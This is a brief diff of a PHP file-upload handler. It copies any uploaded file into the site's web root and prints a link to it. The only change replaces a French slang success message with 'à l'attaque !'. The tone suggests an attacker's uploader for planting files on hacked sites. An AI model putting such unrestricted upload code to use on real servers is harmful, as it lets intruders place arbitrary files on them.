@@ -12,7 +12,7 @@ if(isset($_POST['upload'])) {
 	if(is_writable($root)) {
 		if(@copy($_FILES['kiki']['tmp_name'], $dest)) {
 			$web = "http://".$_SERVER['HTTP_HOST']."/";
-			echo "J'avais pleins de gadgets dans mon cartable spiderman -> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";
+			echo "à l'attaque ! -> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";
 		} else {
 			echo "Y'a pas moyen gros.";
 		}
